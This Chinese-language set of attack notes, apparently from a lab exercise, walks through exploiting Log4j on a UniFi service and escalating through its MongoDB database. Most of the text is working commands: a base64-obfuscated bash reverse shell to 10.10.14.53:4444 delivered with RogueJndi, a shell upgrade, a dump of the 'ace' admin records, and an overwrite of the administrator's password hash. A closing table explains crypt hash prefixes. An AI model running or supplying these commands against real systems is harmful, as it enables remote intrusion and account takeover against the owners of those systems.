关键词：log4j利用 mongodb提权

shell:
echo 'bash -c bash -i >&/dev/tcp/10.10.14.53/4444 0>&1' | base64
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuNTMvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.14.53"

script /dev/null -c bash

mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"` #ace是unifi默认数据库
x_shadow# 系统管理员hash密码 $6$是sha-512标志头
mkpasswd -m sha-512 Password1234 #生成sha-512密码
mongo --port 27117 ace --eval 'db.admin.update({"_id":
ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"SHA_512 Hash Generated"}})'#替换管理员密码


知识扩展：

| 标志 | 算法 | 说明 |
| --- | --- | --- |
| `$1$` | **MD5** | 传统的 MD5-based crypt，比较老，安全性差。 |
| `$2a$` `$2y$` `$2b$` | **Blowfish (bcrypt)** | bcrypt 系列，很多现代系统常用，强度较高。 |
| `$5$` | **SHA-256** | 使用 SHA-256 的 crypt 算法。 |
| `$6$` | **SHA-512** | 使用 SHA-512 的 crypt 算法，常见于现代 Linux。 |
